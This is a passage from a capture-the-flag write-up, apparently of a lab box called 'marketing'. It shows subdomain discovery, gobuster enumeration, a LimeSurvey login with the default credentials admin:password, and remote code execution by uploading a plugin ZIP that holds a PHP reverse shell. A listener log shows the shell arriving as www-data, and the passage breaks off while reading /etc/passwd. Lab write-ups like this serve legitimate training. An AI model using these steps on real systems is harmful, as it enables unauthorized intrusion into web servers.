-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">13</span>.48 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 329px;"></div><div class="CodeMirror-gutters" style="display: none; height: 329px;"></div></div></div></pre><p><span>Although the </span><code>index.html</code><span> files in the root and </span><code>/old</code><span> appeared identical, I discovered a hidden link to </span><code>customers-survey.marketing.pg</code><span> within the source code of the </span><code>/old</code><span> page.</span></p><p><img src="./marketing.assets/image-20260208152241451.png" alt="image-20260208152241451"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/old</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="display: none; height: 22px;"></div></div></div></pre><p><img src="./marketing.assets/image-20260208152247571.png" alt="image-20260208152247571"></p><p><img src="./marketing.assets/image-20260208152253203.png" alt="image-20260208152253203"></p><p><span>I added this subdomain to my </span><code>/etc/hosts</code><span> file as well.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ echo</span> <span class="cm-string">'192.168.170.225 customers-survey.marketing.pg'</span> | <span class="cm-builtin">sudo</span> <span class="cm-builtin">tee</span> <span class="cm-attribute">-a</span> /etc/hosts</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">192</span>.168.170.225 customers-survey.marketing.pg</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 66px;"></div><div class="CodeMirror-gutters" style="display: none; height: 66px;"></div></div></div></pre><p><span>Navigating to the subdomain revealed a </span><strong><span>LimeSurvey</span></strong><span> instance.</span></p><p><img src="./marketing.assets/image-20260208152259295.png" alt="image-20260208152259295"></p><p><span>Using </span><code>gobuster</code><span> for directory brute-forcing and researching for default credentials, I successfully logged in as </span><code>admin:password</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ gobuster</span> dir <span class="cm-attribute">-u</span> &lt;http://customers-survey.marketing.pg&gt; <span class="cm-attribute">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="cm-attribute">-b</span> <span class="cm-number">403</span>,404</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Gobuster v3.6</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Url: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;http://customers-survey.marketing.pg&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Method: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  GET</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Threads: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">10</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Wordlist: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  /usr/share/seclists/Discovery/Web-Content/common.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Negative Status codes: &nbsp; <span class="cm-number">403</span>,404</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] User Agent: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  gobuster/3.6</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Timeout: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10s</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting gobuster <span class="cm-keyword">in</span> directory enumeration mode</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/LICENSE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">49474</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/admin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">346</span>] [--&gt; &lt;http://customers-survey.marketing.pg/admin/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/assets &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">347</span>] [--&gt; &lt;http://customers-survey.marketing.pg/assets/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/index.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">47972</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/installer &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">350</span>] [--&gt; &lt;http://customers-survey.marketing.pg/installer/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/modules &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">348</span>] [--&gt; &lt;http://customers-survey.marketing.pg/modules/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/package.json &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">62</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/plugins &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">348</span>] [--&gt; &lt;http://customers-survey.marketing.pg/plugins/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/tests &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">346</span>] [--&gt; &lt;http://customers-survey.marketing.pg/tests/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/themes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">347</span>] [--&gt; &lt;http://customers-survey.marketing.pg/themes/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/tmp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">344</span>] [--&gt; &lt;http://customers-survey.marketing.pg/tmp/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/upload &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">347</span>] [--&gt; &lt;http://customers-survey.marketing.pg/upload/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Progress: <span class="cm-number">4746</span> / <span class="cm-number">4747</span> (99.98%)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Finished</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 702px;"></div><div class="CodeMirror-gutters" style="display: none; height: 702px;"></div></div></div></pre><p><img src="./marketing.assets/image-20260208152306493.png" alt="image-20260208152306493"></p><p><img src="./marketing.assets/image-20260208152311212.png" alt="image-20260208152311212"></p><p><img src="./marketing.assets/image-20260208152317584.png" alt="image-20260208152317584"></p><p><span>I found this Github repository leveraging a plugin exploit to gain Remote Code Execution. The author also wrote the instruction on how to perform the exploit very clearly.</span></p><p><a href='https://github.com/Y1LD1R1M-1337/Limesurvey-RCE' target='_blank' class='url'>https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a></p><p><span>I created a </span><code>config.xml</code><span> and a PHP reverse shell, archived them as a ZIP file.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/Limesurvey-RCE]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ zip</span> wook.zip config.xml php-rev.php </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  adding: config.xml (deflated <span class="cm-number">56</span>%)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  adding: php-rev.php (deflated <span class="cm-number">60</span>%)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/Limesurvey-RCE]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ unzip</span> <span class="cm-attribute">-l</span> wook.zip </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Archive:  wook.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Length &nbsp; &nbsp;  Date &nbsp;  Time &nbsp;  Name</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp;<span class="cm-attribute">----------</span> <span class="cm-attribute">-----</span> &nbsp; <span class="cm-attribute">----</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">756</span> &nbsp;<span class="cm-number">2026</span><span class="cm-attribute">-01-28</span> <span class="cm-number">01</span>:59 &nbsp; config.xml</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">2430</span> &nbsp;<span class="cm-number">2026</span><span class="cm-attribute">-01-28</span> <span class="cm-number">02</span>:00 &nbsp; php-rev.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-attribute">-------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">3186</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">2</span> files</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre><p><img src="./marketing.assets/image-20260208152326321.png" alt="image-20260208152326321"></p><p><span>Uploaded them via </span><strong><span>Configuration → Plugins → Upload &amp; Install.</span></strong><span> Upon activating the plugin, I received a reverse shell as the </span><code>www-data</code><span> user.</span></p><p><img src="./marketing.assets/image-20260208152332343.png" alt="image-20260208152332343"></p><h1 id='shell-as-www-data'><span>Shell as </span><code>www-data</code></h1><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ python3</span> penelope.py <span class="cm-attribute">-p</span> <span class="cm-number">443</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Listening <span class="cm-keyword">for</span> reverse shells on <span class="cm-number">0</span>.0.0.0:443 → &nbsp;<span class="cm-number">127</span>.0.0.1 • <span class="cm-number">192</span>.168.136.128 • <span class="cm-number">172</span>.17.0.1 • <span class="cm-number">172</span>.20.0.1 • <span class="cm-number">192</span>.168.45.236</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Got reverse shell from marketing~192.168.170.225-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Attempting to upgrade shell to PTY...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Shell upgraded successfully using /usr/bin/python3! 💪</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Interacting with session [1], Shell Type: PTY, Menu key: F12 </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Logging to /home/kali/.penelope/sessions/marketing~192.168.170.225-Linux-x86_64/2026_01_28-02_07_20-684.log 📜</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data@marketing:/<span class="cm-def">$ whoami</span>;id;hostname</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">uid</span><span class="cm-operator">=</span><span class="cm-number">33</span>(www-data) <span class="cm-def">gid</span><span class="cm-operator">=</span><span class="cm-number">33</span>(www-data) <span class="cm-def">groups</span><span class="cm-operator">=</span><span class="cm-number">33</span>(www-data)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">marketing</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data@marketing:/<span class="cm-def">$ </span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 329px;"></div><div class="CodeMirror-gutters" style="display: none; height: 329px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data@marketing:/home<span class="cm-def">$ ls</span> <span class="cm-attribute">-R</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">m.sander  t.miller</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./m.sander:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">personal</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">ls</span>: cannot open directory <span class="cm-string">'./m.sander/personal'</span>: Permission denied</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./t.miller:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">local.txt</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 219px;"></div><div class="CodeMirror-gutters" style="display: none; height: 219px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data@marketing:/home/t.miller<span class="cm-def">$ cat</span> /etc/passwd</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root:x:0:0:root:/root:/bin/bash</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sync:x:4:65534:sync:/bin:/bin/sync</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" 